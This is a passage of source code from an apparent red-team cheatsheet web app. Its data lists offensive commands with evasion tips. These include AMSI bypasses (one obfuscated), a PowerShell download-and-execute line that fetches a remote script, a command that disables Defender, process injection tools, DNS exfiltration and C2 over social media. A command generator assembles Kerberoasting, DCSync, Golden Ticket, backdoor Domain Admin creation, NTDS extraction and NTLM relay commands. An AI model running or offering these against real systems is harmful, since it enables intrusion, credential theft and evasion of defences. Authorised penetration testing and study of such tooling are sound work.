            example: 'python3 ProcessHollowing.py -t notepad.exe -p payload.exe',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.012',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Creates legitimate-looking process with malicious code',
            evasionTips: 'Use common system processes as targets'
          }
        ]
      },
      {
        name: 'AMSI Bypass',
        description: 'Techniques to bypass Anti-Malware Scan Interface',
        commands: [
          {
            command: '[Ref].Assembly.GetType(\\"System.Management.Automation.AmsiUtils\\").GetField(\\"amsiInitFailed\\",\\"NonPublic,Static\\").SetValue($null,$true)',
            description: 'Classic AMSI bypass via reflection',
            mitreTechnique: 'Disable or Modify Tools',
            mitreId: 'T1562.001',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'Well-known bypass, may be detected',
            evasionTips: 'Obfuscate the bypass code, use alternative methods'
          },
          {
            command: '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \\"*iUtils\\") {$c=$b}};$d=$c.GetFields(\\"NonPublic,Static\\");Foreach($e in $d) {if ($e.Name -like \\"*Failed\\") {$f=$e}};$f.SetValue($null,$true)',
            description: 'Obfuscated AMSI bypass',
            mitreTechnique: 'Disable or Modify Tools',
            mitreId: 'T1562.001',
            riskLevel: 'Medium',
            platform: ['Windows'],
            evasionTips: 'Further obfuscate variable names and logic'
          },
          {
            command: 'powershell.exe -version 2 -Command "Your-Command-Here"',
            description: 'Use PowerShell v2 to bypass AMSI (if available)',
            example: 'powershell.exe -version 2 -Command "IEX (New-Object Net.WebClient).DownloadString(\\"https://example.com/script.ps1\\")"',
            mitreTechnique: 'Disable or Modify Tools',
            mitreId: 'T1562.001',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'PowerShell v2 lacks AMSI integration',
            evasionTips: 'Check if PowerShell v2 is available on target',
            prerequisites: 'PowerShell v2 must be installed'
          },
          {
            command: 'python3 AMSITrigger.py -i {powershell_script}',
            description: 'Identify AMSI detection triggers in PowerShell',
            example: 'python3 AMSITrigger.py -i script.ps1',
            mitreTechnique: 'Disable or Modify Tools',
            mitreId: 'T1562.001',
            riskLevel: 'Low',
            platform: ['Windows'],
            evasionTips: 'Modify detected strings to bypass AMSI',
            references: ['https://github.com/RythmStick/AMSITrigger']
          },
          {
            command: 'Set-MpPreference -DisableRealtimeMonitoring $true',
            description: 'Disable Windows Defender real-time monitoring',
            mitreTechnique: 'Disable or Modify Tools',
            mitreId: 'T1562.001',
            riskLevel: 'Critical',
            platform: ['Windows'],
            opsecNotes: 'Requires administrator privileges, highly suspicious',
            evasionTips: 'Use only when stealth is not required',
            prerequisites: 'Administrator privileges required'
          }
        ]
      },
      {
        name: 'Memory Evasion',
        description: 'Advanced in-memory evasion and injection techniques',
        commands: [
          {
            command: 'python3 pe2shellcode.py {pe_file}',
            description: 'Convert PE to position-independent shellcode',
            example: 'python3 pe2shellcode.py payload.exe',
            mitreTechnique: 'Reflective Code Loading',
            mitreId: 'T1620',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'In-memory execution avoids file-based detection',
            evasionTips: 'Use with process injection for stealth execution'
          },
          {
            command: 'Invoke-DllInjection -ProcessID {pid} -Dll {dll_path}',
            description: 'Inject DLL into target process',
            example: 'Invoke-DllInjection -ProcessID 1234 -Dll C:\\temp\\payload.dll',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.001',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'DLL injection into legitimate processes',
            evasionTips: 'Target common system processes like explorer.exe'
          },
          {
            command: 'python3 AtomBombing.py -p {process_name} -s {shellcode}',
            description: 'AtomBombing injection technique',
            example: 'python3 AtomBombing.py -p notepad.exe -s shellcode.bin',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.015',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Uses Windows Atom Tables for injection',
            evasionTips: 'Difficult to detect, bypasses many EDR solutions',
            references: ['https://github.com/BreakingMalwareResearch/atom-bombing']
          },
          {
            command: 'python3 ProcessDoppelganging.py -t {target_exe} -p {payload}',
            description: 'Process Doppelgänging technique',
            example: 'python3 ProcessDoppelganging.py -t svchost.exe -p payload.exe',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.013',
            riskLevel: 'Critical',
            platform: ['Windows'],
            opsecNotes: 'Advanced technique using NTFS transactions',
            evasionTips: 'Bypasses process creation callbacks',
            references: ['https://github.com/Spajed/processrefund']
          },
          {
            command: 'python3 ProcessHerpaderping.py -t {target} -p {payload}',
            description: 'Process Herpaderping evasion technique',
            example: 'python3 ProcessHerpaderping.py -t calc.exe -p malware.exe',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.012',
            riskLevel: 'Critical',
            platform: ['Windows'],
            opsecNotes: 'Obscures process image on disk',
            evasionTips: 'Evades static analysis and forensics',
            references: ['https://github.com/jxy-s/herpaderping']
          },
          {
            command: 'Invoke-ManualMap -ProcessID {pid} -DllPath {dll_path}',
            description: 'Manual DLL mapping to avoid LoadLibrary detection',
            example: 'Invoke-ManualMap -ProcessID 1234 -DllPath payload.dll',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.001',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Bypasses DLL load monitoring',
            evasionTips: 'Does not appear in PEB module list'
          },
          {
            command: 'python3 ThreadlessInject.py -p {pid} -s {shellcode}',
            description: 'Threadless injection using ROP chains',
            example: 'python3 ThreadlessInject.py -p 1234 -s payload.bin',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055',
            riskLevel: 'Critical',
            platform: ['Windows'],
            opsecNotes: 'No new threads created, harder to detect',
            evasionTips: 'Bypasses thread-based detection mechanisms',
            references: ['https://github.com/CCob/ThreadlessInject']
          },
          {
            command: 'python3 ModuleStomping.py -p {pid} -m {module} -s {shellcode}',
            description: 'Module stomping technique',
            example: 'python3 ModuleStomping.py -p 1234 -m ntdll.dll -s payload.bin',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055.009',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Overwrites legitimate module memory',
            evasionTips: 'Choose unused or rarely accessed modules'
          }
        ]
      },
      {
        name: 'Steganography & Covert Channels',
        description: 'Data hiding and covert communication techniques',
        commands: [
          {
            command: 'steghide embed -cf {cover_file} -ef {secret_file} -p {password}',
            description: 'Hide data in image files using steganography',
            example: 'steghide embed -cf image.jpg -ef secret.txt -p mypassword',
            mitreTechnique: 'Data Obfuscation',
            mitreId: 'T1027.003',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            evasionTips: 'Use common image formats, avoid suspicious file sizes'
          },
          {
            command: 'python3 dns-exfil.py -d {domain} -f {file}',
            description: 'Exfiltrate data via DNS queries',
            example: 'python3 dns-exfil.py -d tunnel.example.com -f sensitive.txt',
            mitreTechnique: 'Exfiltration Over Alternative Protocol',
            mitreId: 'T1048.003',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'DNS queries may be logged and monitored',
            evasionTips: 'Use legitimate-looking domain names, limit query frequency'
          },
          {
            command: 'python3 icmp-tunnel.py -t {target_ip} -f {file}',
            description: 'Covert channel using ICMP packets',
            example: 'python3 icmp-tunnel.py -t 8.8.8.8 -f data.txt',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'ICMP traffic may be filtered or monitored',
            evasionTips: 'Use legitimate ping patterns, vary packet timing'
          },
          {
            command: 'python3 twitter-c2.py -k {api_key} -s {api_secret}',
            description: 'Command and control via social media',
            example: 'python3 twitter-c2.py -k your_api_key -s your_secret',
            mitreTechnique: 'Web Service',
            mitreId: 'T1102.001',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Social media activity may be monitored',
            evasionTips: 'Use legitimate-looking accounts, blend with normal activity'
          },
          {
            command: 'python3 github-c2.py -r {repo} -t {token}',
            description: 'Command and control via GitHub repositories',
            example: 'python3 github-c2.py -r user/repo -t github_token',
            mitreTechnique: 'Web Service',
            mitreId: 'T1102.001',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            evasionTips: 'Use private repositories, legitimate commit messages'
          },
          {
            command: 'python3 slack-c2.py -w {webhook_url}',
            description: 'Command and control via Slack webhooks',
            example: 'python3 slack-c2.py -w https://hooks.slack.com/services/...',
            mitreTechnique: 'Web Service',
            mitreId: 'T1102.001',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            evasionTips: 'Use legitimate workspace names, normal message patterns'
          }
        ]
      }
    ]
  },
  {
    name: 'Forensics & DFIR',
    icon: <Microscope className="w-5 h-5" />,
    description: 'Digital forensics and incident response techniques',
    subcategories: [
      {
        name: 'Memory Analysis',
        description: 'Memory dump analysis and forensics',
        commands: [
          {
            command: 'volatility -f {memory_dump} --profile={profile} pslist',
            description: 'List running processes from memory dump',
            example: 'volatility -f memory.dmp --profile=Win7SP1x64 pslist',
            mitreTechnique: 'Process Discovery',
            mitreId: 'T1057',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://github.com/volatilityfoundation/volatility']
          },
          {
            command: 'volatility -f {memory_dump} --profile={profile} netscan',
            description: 'Extract network connections from memory',
            example: 'volatility -f memory.dmp --profile=Win7SP1x64 netscan',
            mitreTechnique: 'System Network Connections Discovery',
            mitreId: 'T1049',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'volatility -f {memory_dump} --profile={profile} malfind',
            description: 'Find injected code and malware in memory',
            example: 'volatility -f memory.dmp --profile=Win7SP1x64 malfind',
            mitreTechnique: 'Process Injection',
            mitreId: 'T1055',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'rekall -f {memory_dump} pslist',
            description: 'Alternative memory analysis with Rekall',
            example: 'rekall -f memory.dmp pslist',
            mitreTechnique: 'Process Discovery',
            mitreId: 'T1057',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          }
        ]
      },
      {
        name: 'Disk Forensics',
        description: 'Disk image analysis and file recovery',
        commands: [
          {
            command: 'dd if={source_device} of={image_file} bs=4096 conv=noerror,sync',
            description: 'Create forensic disk image',
            example: 'dd if=/dev/sda of=disk_image.dd bs=4096 conv=noerror,sync',
            mitreTechnique: 'Data from Local System',
            mitreId: 'T1005',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Creates bit-for-bit copy of storage device'
          },
          {
            command: 'autopsy',
            description: 'Launch Autopsy digital forensics platform',
            mitreTechnique: 'Data from Local System',
            mitreId: 'T1005',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://www.autopsy.com/']
          },
          {
            command: 'sleuthkit fls -r {image_file}',
            description: 'List files in disk image recursively',
            example: 'sleuthkit fls -r disk_image.dd',
            mitreTechnique: 'File and Directory Discovery',
            mitreId: 'T1083',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'foremost -i {image_file} -o {output_dir}',
            description: 'Recover deleted files from disk image',
            example: 'foremost -i disk_image.dd -o recovered_files/',
            mitreTechnique: 'Data Recovery',
            mitreId: 'T1005',
            riskLevel: 'Low',
            platform: ['Linux']
          }
        ]
      },
      {
        name: 'Network Forensics',
        description: 'Network traffic analysis and investigation',
        commands: [
          {
            command: 'wireshark -r {pcap_file}',
            description: 'Analyze network capture with Wireshark',
            example: 'wireshark -r network_traffic.pcap',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'tshark -r {pcap_file} -Y "{filter}" -T fields -e {field}',
            description: 'Extract specific fields from network capture',
            example: 'tshark -r traffic.pcap -Y "http.request" -T fields -e http.host -e http.uri',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS']
          },
          {
            command: 'networkminer -f {pcap_file}',
            description: 'Network forensic analysis with NetworkMiner',
            example: 'networkminer -f network_capture.pcap',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Low',
            platform: ['Windows']
          },
          {
            command: 'zeek -r {pcap_file}',
            description: 'Analyze network traffic with Zeek (Bro)',
            example: 'zeek -r network_traffic.pcap',
            mitreTechnique: 'Network Sniffing',
            mitreId: 'T1040',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS']
          }
        ]
      }
    ]
  }
];

// Command Generator questions
const commandGeneratorQuestions: CommandGeneratorQuestion[] = [
  {
    id: 'attackType',
    question: 'What type of assessment are you conducting?',
    options: ['Active Directory', 'Web Application', 'Network Infrastructure', 'Cloud'],
    type: 'select'
  },
  {
    id: 'hasTarget',
    question: 'Do you have a target IP or hostname?',
    type: 'checkbox'
  },
  {
    id: 'targetIP',
    question: 'What is the target IP/hostname?',
    placeholder: 'e.g., 192.168.1.10 or example.com',
    type: 'text',
    dependsOn: {
      questionId: 'hasTarget',
      values: ['true']
    }
  },
  {
    id: 'hasCredentials',
    question: 'Do you have any credentials?',
    type: 'checkbox',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory', 'Network Infrastructure', 'Cloud']
    }
  },
  {
    id: 'username',
    question: 'Username',
    placeholder: 'e.g., jsmith or domain\\jsmith',
    type: 'text',
    dependsOn: {
      questionId: 'hasCredentials',
      values: ['true']
    }
  },
  {
    id: 'password',
    question: 'Password',
    placeholder: 'e.g., Password123!',
    type: 'text',
    dependsOn: {
      questionId: 'hasCredentials',
      values: ['true']
    }
  },
  {
    id: 'adDomain',
    question: 'Do you know the domain name?',
    type: 'checkbox',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    }
  },
  {
    id: 'domainName',
    question: 'Domain name',
    placeholder: 'e.g., contoso.local',
    type: 'text',
    dependsOn: {
      questionId: 'adDomain',
      values: ['true']
    }
  },
  {
    id: 'webTarget',
    question: 'Target URL',
    placeholder: 'e.g., https://example.com',
    type: 'text',
    dependsOn: {
      questionId: 'attackType',
      values: ['Web Application']
    }
  },
  {
    id: 'cloudType',
    question: 'Cloud Provider',
    options: ['AWS', 'Azure', 'Google Cloud'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Cloud']
    }
  },
  {
    id: 'adPhase',
    question: 'Which phase of Active Directory testing are you in?',
    options: ['Initial Access', 'Enumeration', 'Lateral Movement', 'Privilege Escalation', 'Domain Persistence', 'Data Exfiltration'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    }
  },
  {
    id: 'adTools',
    question: 'Do you have these tools available?',
    options: ['Impacket', 'Bloodhound', 'Mimikatz', 'Rubeus', 'PowerView', 'Responder', 'CrackMapExec'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    },
    advanced: true
  },
  {
    id: 'adProtectedUsers',
    question: 'Are user accounts protected by additional controls?',
    options: ['LAPS', 'MFA', 'PAM', 'JIT Access', 'Not Sure'],
    type: 'select',
    dependsOn: {
      questionId: 'attackType',
      values: ['Active Directory']
    },
    advanced: true
  }
];

// Add advanced features to the command generator
const advancedFeatures = [
  {
    id: 'opsec',
    name: 'OPSEC Considerations',
    description: 'Include operational security notes with each command'
  },
  {
    id: 'evasion',
    name: 'Evasion Techniques',
    description: 'Add evasion variants for common detection systems'
  },
  {
    id: 'cleanup',
    name: 'Cleanup Commands',
    description: 'Include cleanup steps to remove artifacts'
  },
  {
    id: 'chaining',
    name: 'Command Chaining',
    description: 'Combine multiple commands for efficiency'
  }
];

const RedTeamCheatsheetWrapper = () => {
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
  const [selectedSubcategory, setSelectedSubcategory] = useState<string | null>(null);
  const [expandedCommands, setExpandedCommands] = useState<Record<string, boolean>>({});
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
  const [showHelperInfo, setShowHelperInfo] = useState(true);
  const [activeHelp, setActiveHelp] = useState<string | null>(null);
  const [filterRiskLevel, setFilterRiskLevel] = useState<string>('');
  const [filterPlatform, setFilterPlatform] = useState<string>('');
  const [filterMitre, setFilterMitre] = useState<boolean>(false);
  const [showAdvancedFilters, setShowAdvancedFilters] = useState<boolean>(false);
  
  // Command Generator state
  const [showCommandGenerator, setShowCommandGenerator] = useState(false);
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [generatedCommands, setGeneratedCommands] = useState<GeneratedCommand[]>([]);
  const [commandGenerationComplete, setCommandGenerationComplete] = useState(false);
  const [advancedMode, setAdvancedMode] = useState(false);
  const [selectedAdvancedFeatures, setSelectedAdvancedFeatures] = useState<string[]>([]);

  // Custom Command Builder state
  const [showCustomBuilder, setShowCustomBuilder] = useState(false);
  const [customCommands, setCustomCommands] = useState<GeneratedCommand[]>([]);
  const [currentCustomCommand, setCurrentCustomCommand] = useState<GeneratedCommand>({
    title: '',
    description: '',
    command: '',
    notes: ''
  });
  
  // UX Enhancement state
  const [isLoadingCategory, setIsLoadingCategory] = useState(false);
  
  // Refs for smooth scrolling
  const resultsRef = useRef<HTMLDivElement>(null);
  const categoriesRef = useRef<HTMLDivElement>(null);

  // Help tips data
  const helpTips = {
    infrastructure: "Infrastructure attacks focus on network reconnaissance, exploitation of services, and privilege escalation on compromised systems.",
    windowsAD: "Active Directory is Microsoft's identity management service that enables administrators to manage permissions and access to network resources.",
    webAttacks: "Web attacks target vulnerabilities in web applications, such as SQL injection, XSS, and file upload vulnerabilities.",
    postExploitation: "Post-exploitation activities occur after initial access is gained, including establishing persistence and extracting credentials.",
    c2Frameworks: "Command and Control (C2) frameworks are used to maintain communications with compromised systems while evading detection.",
    cloud: "Cloud attacks target misconfigurations and vulnerabilities in cloud environments like AWS, Azure, and Google Cloud."
  };

  // Enhanced filter commands based on search term and advanced filters
  const filteredCategories = cheatsheetData
    .map(category => {
      const filteredSubcategories = category.subcategories
        .map(subcategory => {
          const filteredCommands = subcategory.commands.filter(cmd => {
            // Text search filter
            const matchesSearch = !searchTerm || 
              cmd.command.toLowerCase().includes(searchTerm.toLowerCase()) ||
              cmd.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
              (cmd.example && cmd.example.toLowerCase().includes(searchTerm.toLowerCase())) ||
              (cmd.mitreTechnique && cmd.mitreTechnique.toLowerCase().includes(searchTerm.toLowerCase())) ||
              (cmd.mitreId && cmd.mitreId.toLowerCase().includes(searchTerm.toLowerCase()));
            
            // Risk level filter
            const matchesRiskLevel = !filterRiskLevel || cmd.riskLevel === filterRiskLevel;
            
            // Platform filter
            const matchesPlatform = !filterPlatform || 
              (cmd.platform && cmd.platform.includes(filterPlatform));
            
            // MITRE ATT&CK filter
            const matchesMitre = !filterMitre || (cmd.mitreTechnique && cmd.mitreId);
            
            return matchesSearch && matchesRiskLevel && matchesPlatform && matchesMitre;
          });
          return {
            ...subcategory,
            commands: filteredCommands
          };
        })
        .filter(subcategory => subcategory.commands.length > 0 || subcategory.name.toLowerCase().includes(searchTerm.toLowerCase()));
      
      return {
        ...category,
        subcategories: filteredSubcategories
      };
    })
    .filter(category => 
      category.subcategories.length > 0 || 
      category.name.toLowerCase().includes(searchTerm.toLowerCase())
    );

  // Generate commands based on answers with advanced options
  const generateCommands = () => {
    let commands: GeneratedCommand[] = [];
    const attackType = answers['attackType'] || '';
    const targetIP = answers['targetIP'] || '';
    const hasCredentials = answers['hasCredentials'] === 'true';
    const username = answers['username'] || '';
    const password = answers['password'] || '';
    const domainName = answers['domainName'] || '';
    const webTarget = answers['webTarget'] || '';
    const cloudType = answers['cloudType'] || '';
    
    const includeOpsec = selectedAdvancedFeatures.includes('opsec');
    const includeEvasion = selectedAdvancedFeatures.includes('evasion');
    const includeCleanup = selectedAdvancedFeatures.includes('cleanup');
    const includeChaining = selectedAdvancedFeatures.includes('chaining');

    // Initial reconnaissance commands for all attack types
    if (targetIP) {
      commands.push({
        title: 'Basic Network Scan',
        description: 'Perform a quick network scan to identify open ports',
        command: `nmap -sV -sC -p- ${targetIP}`,
        notes: 'This will scan all ports and identify services running on the target'
      });
    }

    if (attackType === 'Active Directory') {
      const adPhase = answers['adPhase'] || '';
      const adTools = answers['adTools'] || '';
      const adProtectedUsers = answers['adProtectedUsers'] || '';
      
      // Initial reconnaissance commands (some may already exist)
      if (targetIP) {
        commands.push({
          title: 'Enumerate SMB Shares',
          description: 'List available SMB shares on the target',
          command: `smbclient -L //${targetIP}/ -N`,
          notes: 'Lists SMB shares without authentication (null session)',
          mitreTechnique: 'Network Share Discovery',
          mitreId: 'T1135'
        });
        
        commands.push({
          title: 'Check for Anonymous Access',
          description: 'Test for anonymous access to SMB shares',
          command: `crackmapexec smb ${targetIP} -u '' -p ''`,
          notes: 'Attempts to connect to SMB with null credentials',
          mitreTechnique: 'Network Share Discovery',
          mitreId: 'T1135'
        });
        
        // Add more sophisticated commands for initial recon
        commands.push({
          title: 'LDAP Anonymous Bind',
          description: 'Test for LDAP anonymous bind',
          command: `ldapsearch -x -h ${targetIP} -D '' -w '' -b "DC=${domainName?.split('.').join(',DC=')}"`,
          notes: 'Checks if LDAP server allows anonymous binds',
          mitreTechnique: 'Network Service Scanning',
          mitreId: 'T1046'
        });
        
        commands.push({
          title: 'Detect Domain Controllers',
          description: 'Find domain controllers in the network',
          command: `nmap -p 389,636,3268,3269 --open ${targetIP}/24`,
          notes: 'Scans for LDAP ports that indicate domain controllers',
          mitreTechnique: 'Remote System Discovery',
          mitreId: 'T1018'
        });
      }
      
      // Enhanced commands for domain enumeration
      if (domainName) {
        commands.push({
          title: 'Domain User Enumeration',
          description: 'Attempt to enumerate domain users',
          command: `enum4linux -U ${targetIP}`,
          notes: 'Tries to list domain users via RID cycling',
          mitreTechnique: 'Account Discovery',
          mitreId: 'T1087'
        });
        
        commands.push({
          title: 'Kerberos User Enumeration',
          description: 'Check for Kerberos pre-auth disabled users (AS-REP Roasting)',
          command: `GetNPUsers.py ${domainName}/ -dc-ip ${targetIP} -request -format hashcat -outputfile asreproast.txt`,
          notes: 'May obtain crackable hashes for users with Kerberos pre-auth disabled',
          mitreTechnique: 'Steal or Forge Kerberos Tickets',
          mitreId: 'T1558.004'
        });
        
        // Add new specific commands for finding domain information
        commands.push({
          title: 'Domain Trust Mapping',
          description: 'Map domain trusts to find attack paths',
          command: `Get-DomainTrust.py -u '' -p '' -d ${domainName} -dc-ip ${targetIP}`,
          notes: 'Discovers trust relationships between domains which could be leveraged for lateral movement',
          mitreTechnique: 'Domain Trust Discovery',
          mitreId: 'T1482'
        });
      }
      
      // Enhanced credential-based commands
      if (hasCredentials && username && password) {
        commands.push({
          title: 'Authenticate with Credentials',
          description: 'Test provided credentials against the target',
          command: `crackmapexec smb ${targetIP} -u "${username}" -p "${password}"`,
          notes: 'Checks if credentials are valid',
          mitreTechnique: 'Valid Accounts',
          mitreId: 'T1078'
        });
        
        // Add more advanced enumeration commands with credentials
        if (adTools === 'Bloodhound' || advancedMode) {
          commands.push({
            title: 'Enumerate Domain with BloodHound',
            description: 'Collect Active Directory data for analysis with BloodHound',
            command: `bloodhound-python -d ${domainName} -u "${username}" -p "${password}" -ns ${targetIP} -c All`,
            notes: 'Collects data about users, groups, computers, and permissions for attack path analysis',
            mitreTechnique: 'Domain Trust Discovery',
            mitreId: 'T1482'
          });
        }
        
        commands.push({
          title: 'Enumerate Domain Users',
          description: 'List all domain users with authenticated access',
          command: `GetADUsers.py -all ${domainName}/${username}:"${password}" -dc-ip ${targetIP}`,
          notes: 'Shows detailed information about domain users',
          mitreTechnique: 'Account Discovery',
          mitreId: 'T1087.002'
        });
        
        commands.push({
          title: 'Kerberoasting Attack',
          description: 'Request service tickets for accounts with SPNs',
          command: `GetUserSPNs.py ${domainName}/${username}:"${password}" -dc-ip ${targetIP} -request -outputfile kerberoast.txt`,
          notes: 'Obtains service tickets that can be cracked offline',
          mitreTechnique: 'Steal or Forge Kerberos Tickets',
          mitreId: 'T1558.003'
        });
        
        // Add key phase-specific commands for AD testing
        if (adPhase === 'Lateral Movement' || advancedMode) {
          commands.push({
            title: 'Find Local Admin Access',
            description: 'Identify machines where our user has local admin rights',
            command: `crackmapexec smb ${targetIP}/24 -u "${username}" -p "${password}" --local-auth`,
            notes: 'Scans the network to find computers where the credentials have local admin access',
            mitreTechnique: 'Remote Services',
            mitreId: 'T1021'
          });
          
          commands.push({
            title: 'Find Admin Sessions',
            description: 'Look for logged-in domain admins on network computers',
            command: `crackmapexec smb ${targetIP}/24 -u "${username}" -p "${password}" --sessions`,
            notes: 'Identifies machines where privileged users are logged in for potential session hijacking',
            mitreTechnique: 'Account Discovery',
            mitreId: 'T1087.002'
          });
          
          commands.push({
            title: 'WMI Command Execution',
            description: 'Execute commands remotely via WMI',
            command: `wmiexec.py ${domainName}/${username}:"${password}"@${targetIP} "whoami /all"`,
            notes: 'Uses Windows Management Instrumentation for remote command execution',
            mitreTechnique: 'Windows Management Instrumentation',
            mitreId: 'T1047'
          });
          
          commands.push({
            title: 'PowerShell Remoting',
            description: 'Use PowerShell remoting for command execution',
            command: `crackmapexec winrm ${targetIP} -u "${username}" -p "${password}" -x "whoami /all"`,
            notes: 'Execute PowerShell commands remotely, requires WinRM to be enabled',
            mitreTechnique: 'Remote Services',
            mitreId: 'T1021.006'
          });
        }
        
        if (adPhase === 'Privilege Escalation' || advancedMode) {
          commands.push({
            title: 'Check for Kerberos Delegation',
            description: 'Identify systems with Kerberos Delegation enabled',
            command: `findDelegation.py -dc-ip ${targetIP} ${domainName}/${username}:"${password}"`,
            notes: 'Finds potential privilege escalation paths via constrained or unconstrained delegation',
            mitreTechnique: 'Abuse Elevation Control Mechanism',
            mitreId: 'T1548'
          });
          
          commands.push({
            title: 'Extract Group Policies',
            description: 'Download and analyze Group Policy Objects',
            command: `getPac.py -dc-ip ${targetIP} ${domainName}/${username}:"${password}"`,
            notes: 'Extracts group policies which may contain sensitive information or misconfiguration',
            mitreTechnique: 'Group Policy Discovery',
            mitreId: 'T1615'
          });
          
          if (adTools === 'Mimikatz' || advancedMode) {
            commands.push({
              title: 'DCSync Attack',
              description: 'Extract password hashes from the domain controller',
              command: `secretsdump.py ${domainName}/${username}:"${password}"@${targetIP} -just-dc`,
              notes: 'Performs a DCSync attack to retrieve password hashes of all domain users, requires high privileges',
              mitreTechnique: 'OS Credential Dumping: DCSync',
              mitreId: 'T1003.006'
            });
          }
        }
        
        if (adPhase === 'Domain Persistence' || advancedMode) {
          if (adTools === 'Mimikatz' || advancedMode) {
            commands.push({
              title: 'Golden Ticket Creation',
              description: 'Create a Golden Ticket for persistence',
              command: `mimikatz "kerberos::golden /user:Administrator /domain:${domainName} /sid:S-1-5-21-XXXX /krbtgt:HASH_HERE /id:500 /ptt" exit`,
              notes: 'Creates a Golden Ticket - requires krbtgt hash and SID, replace placeholders with actual values',
              mitreTechnique: 'Steal or Forge Kerberos Tickets: Golden Ticket',
              mitreId: 'T1558.001'
            });
          }
          
          commands.push({
            title: 'Add Backdoor User',
            description: 'Create a backdoor domain user account',
            command: `net user backdooruser Password123! /add /domain && net group "Domain Admins" backdooruser /add /domain`,
            notes: 'Creates a new domain admin account. WARNING: Very detectable, use only with authorization',
            mitreTechnique: 'Account Creation',
            mitreId: 'T1136.002'
          });
          
          if (adProtectedUsers === 'LAPS' || advancedMode) {
            commands.push({
              title: 'LAPS Password Extraction',
              description: 'Extract LAPS passwords if accessible',
              command: `crackmapexec ldap ${targetIP} -u "${username}" -p "${password}" -M laps`,
              notes: 'Extracts Local Administrator Password Solution (LAPS) managed passwords if the user has read access',
              mitreTechnique: 'Credentials from Password Stores',
              mitreId: 'T1555'
            });
          }
        }
        
        if (adPhase === 'Data Exfiltration' || advancedMode) {
          commands.push({
            title: 'Extract NTDS.dit',
            description: 'Extract the Active Directory database remotely',
            command: `crackmapexec smb ${targetIP} -u "${username}" -p "${password}" --ntds`,
            notes: 'Extracts the NTDS.dit file containing all domain password hashes, requires Domain Admin privileges',
            mitreTechnique: 'OS Credential Dumping: NTDS',
            mitreId: 'T1003.003'
          });
          
          commands.push({
            title: 'Find Sensitive Files',
            description: 'Search for sensitive files across the domain',
            command: `findDomainShare.py ${domainName}/${username}:"${password}"@${targetIP} -pattern "password|confidential|secret" -share "SYSVOL,NETLOGON"`,
            notes: 'Searches for sensitive files in domain shares, customize the pattern based on target',
            mitreTechnique: 'Data from Network Shared Drive',
            mitreId: 'T1039'
          });
        }
      }
      
      // Add specific commands for certain tools
      if (adTools === 'Responder' || advancedMode) {
        commands.push({
          title: 'LLMNR/NBT-NS Poisoning',
          description: 'Capture NetNTLM hashes using Responder',
          command: `responder -I eth0 -wfv`,
          notes: 'Intercepts name resolution broadcasts to capture authentication attempts, good for initial access',
          mitreTechnique: 'LLMNR/NBT-NS Poisoning and SMB Relay',
          mitreId: 'T1557.001'
        });
        
        if (advancedMode) {
          commands.push({
            title: 'NTLM Relay Attack',
            description: 'Relay captured credentials to authenticate to other systems',
            command: `ntlmrelayx.py -t ${targetIP} -smb2support`,
            notes: 'Relays captured credentials to target systems. Run alongside Responder (with SMB and HTTP disabled)',
            mitreTechnique: 'LLMNR/NBT-NS Poisoning and SMB Relay',
            mitreId: 'T1557.001'
          });
        }
      }
    } 
    else if (attackType === 'Web Application') {
      // Add Web-specific commands
      if (webTarget) {
        commands.push({
          title: 'Basic Web Reconnaissance',
          description: 'Identify web technologies',
